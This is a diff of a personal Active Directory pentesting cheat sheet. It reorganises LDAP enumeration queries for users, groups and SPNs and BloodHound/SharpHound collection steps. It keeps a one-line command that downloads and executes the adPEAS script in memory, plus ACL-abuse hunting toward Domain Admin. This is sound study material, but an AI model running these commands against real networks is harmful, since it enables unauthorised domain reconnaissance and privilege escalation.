@@ -1,12 +1,50 @@
-
-> First, domain controlers should be enumerated as any windows machine. Privilege escalation works the same as well (mostly). Here one can find AD specific enumeration and privilege escalation techniques.
-
-[AD Enumeration Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#domain-enumeration)
-# ADPeas
+#show
+<% tp.file.rename("2_AD_Enumeration")%>
+### Primary DC (PDC):
 ```powershell
-IEX(IWR -usebasicparsing https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1);Invoke-adPEAS
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
 ```
-Wrapper arount BloodHound, PowerView and much more.
+and DN:
+```powershell
+([adsi]'').distinguishedName
+```
+Then set LDAP path of AD:
+```powershell
+$LDAP` = `LDAP://$PDC/$DN`
+```
+
+Also, change the Enumeration Limit:
+```powershell
+$Global:FormatEnumerationLimit = 100
+```
+
+##### Set up `$dirsearcher`
+```powershell
+$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher(New-Object System.DirectoryServices.DirectoryEntry($LDAP))
+```
+### User
+```powershell
+$dirsearcher.filter="samAccountType=805306368"
+$result = $dirsearcher.FindAll()
+Foreach($obj in $result){ $obj.Properties | select {$_.name}, {$_.memberof}, {$_.logoncount} | Format-List }
+```
+Alternative: `net user /domain`
+
+### Groups
+```powershell
+$dirsearcher.filter="objectclass=group"
+$result = $dirsearcher.FindAll()
+Foreach($obj in $result){ $obj.Properties | select {$_.cn}, {$_.member} | Format-List }
+```
+Alternative: `net group /domain`
+List of default groups: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups
+To get more details on a group: `$dirsearcher.filter="(&(objectCategory=group)(cn=Sales Department))"; $dirsearcher.FindAll()`
+
+### AD-integrated services
+```powershell
+setspn -L $user
+```
+
 # BloodHound
 1. **Setup C2 (Kali)**
 ```bash
@@ -26,11 +64,11 @@ powershell -ep bypass
 ```
 
 ```powershell
-.\SharpHound.exe --CollectionMethods All --zipfilename data.zip -d $dnsserver
+.\SharpHound.exe --CollectionMethods All
 ```
 or
 ```powershell
-Import-Module .\Sharphound.ps1; Invoke-BloodHound -CollectionMethod All -OutputDirectory $dir -OutputPrefix $filename
+Import-Module .\Sharphound.ps1; Invoke-BloodHound -CollectionMethod All -OutputDirectory $dir
 ```
 (Both gather all data except for local group policies.)
 
@@ -42,6 +80,16 @@ When done, transfer the .zip to kali ([[2_fileTransfer]])
 	3. Search for our owned prinicpals in the top left search bar. Right-click the node and select "Mark User as Owner"
 	4. Select "Shortest Paths to Domain Admins from Owned Principals"
 	Tips: Use the Control-Key to show information about all nodes. Look for the "?" Help menu, it also contains abuse possibilities.
+
+
+------------
+
+[AD Enumeration Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#domain-enumeration)
+# ADPeas
+```powershell
+IEX(IWR -usebasicparsing https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1);Invoke-adPEAS
+```
+Wrapper arount BloodHound, PowerView and much more.
 
 # PowerView.ps1
 
@@ -85,50 +133,13 @@ Get-NetForestDomain | Get-NetDomainTrust
 ```
 
 # Manual approach
-##### LDAP path of AD
-`$LDAP` = `LDAP://$PDC/$DN`
-with Primary DC (PDC):
-```powershell
-[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
-```
-and DN:
-```powershell
-([adsi]'').distinguishedName
-```
-
-##### Set up `$dirsearcher`
-```powershell
-$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher(New-Object System.DirectoryServices.DirectoryEntry($LDAP))
-```
-##### Users
-```powershell
-$dirsearcher.filter="samAccountType=805306368"
-$result = $dirsearcher.FindAll()
-Foreach($obj in $result){ $obj.Properties | select {$_.name}, {$_.memberof}, {$_.logoncount} }
-```
-(Never tried it. If it does not work, look at page 701 of the manual for the correct command)
-Alternative: `net user /domain` (Make sure that the primary DC is used, see above how to get its address)
 
 ##### Logged-In users
 ```powershell
 .\PsLoggedon.exe \\$host
 ```
 (SysInternals, requires _Remote Registry service_ on the target which is disabled by default since Windows 8, but enabled on Windows Server 2012 R2, 2016 (1607), 2019 (1809), and Server 2022 (21H2))
-##### Groups
-```powershell
-$dirsearcher.filter="objectclass=group"
-$result = $dirsearcher.FindAll()
-Foreach($obj in $result){ $obj.Properties | select {$_.cn}, {$_.member} }
-```
-(Never tried it. If it does not work, look at page 701 of the manual for the correct command)
-Alternative: `net group /domain`
-List of default groups: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups
-To get more details on a group: `$dirsearcher.filter="(&(objectCategory=group)(cn=Sales Department)); $dirsearcher.FindAll()"`
 
-##### AD-integrated services
-```powershell
-setspn -L $user
-```
 ##### ACEs to an object
 ```powershell
 Get-ObjectAcl -Identity $object [ | ? {"GenericAll", "GenericWrite", "WriteOwner", "WriteDACL" -eq $_.ActiveDirectoryRights} ] | Select ActiveDirectoryRights, SecurityIdentifier
